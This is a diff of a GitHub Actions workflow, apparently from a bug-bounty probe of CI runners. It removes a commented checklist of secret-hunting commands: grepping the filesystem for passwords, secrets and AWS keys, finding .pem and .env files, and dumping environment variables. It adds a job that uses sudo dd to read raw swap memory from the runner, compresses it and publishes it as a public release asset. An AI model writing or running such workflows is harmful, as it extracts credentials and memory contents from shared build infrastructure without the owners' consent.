@@ -1,44 +1,37 @@
-name: Testing Workflow
+name: Github BugBounty Memory Debug
 
 on:
   workflow_dispatch:
 
 jobs:
-  execute:
+  extract-swap:
     runs-on: ubuntu-latest
-    name: Execute Commands
     steps:
-      - name: Clone repo
-        uses: actions/checkout@v4.2.2
-        
-      - name : Execute python Swap
-        run: |
-          sudo python3 swap.py 20 --length 12
-          # uname -a                       # Kernel version
-          # cat /etc/os-release            # OS information
-          # hostname                       # Hostname
-          # whoami                         # Current user
-          # id 
-          # env                            # Environment variables
-          # printenv                       # Same as above
-          # set                            # Shell variables (can include secrets)
-          # mount                          # Mounted file systems
-          # df -h                          # Disk space usage
-          # ls /mnt /media /data           # Common mount points
-          # ls -la /                       # Look at root directory
-          # find / -type f -name "*.env"   # Search for environment files
-          # find / -type f -name "config*" # Search for config files
-          # ip a                           # IP addresses
-          # ss -tuln                       # More modern alternative
-          # cat /etc/hosts                 # Hostname resolution
-          # cat /etc/resolv.conf           # DNS configuration
-          # grep -r "password" /           # Find password references
-          # grep -r "secret" /             # Find secrets
-          # grep -r "AWS_SECRET_ACCESS_KEY" / # Common AWS key
-          # find / -type f -name "*.pem"   # Look for private keys
-          # capsh --print                        # Print Linux capabilities
-          # getcap -r /                         # Find files with special capabilities
-          # cat /proc/self/status | grep Cap    # Capabilities in effect
-          # cat /proc/self/cgroup               # Control groups info
-          
-      
+    - name: Check and locate swap
+      id: swap
+      run: |
+        echo "Checking /proc/swaps..."
+        if [ ! -f /proc/swaps ]; then
+          echo "Swap file not found"
+          exit 1
+        fi
+
+        SWAP_PATH=$(awk 'NR==2{print $1}' /proc/swaps)
+        if [ ! -e "$SWAP_PATH" ]; then
+          echo "Swap path does not exist: $SWAP_PATH"
+          exit 1
+        fi
+
+        echo "Using swap device: $SWAP_PATH"
+        echo "SWAP_PATH=$SWAP_PATH" >> $GITHUB_ENV
+
+    - name: Extract 10MB of swap and compress
+      run: |
+        sudo dd if="$SWAP_PATH" bs=1M count=10 status=none | gzip > swap_sample.gz
+
+    - name: Upload swap to release
+      uses: softprops/action-gh-release@v1
+      with:
+        files: swap_sample.gz
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
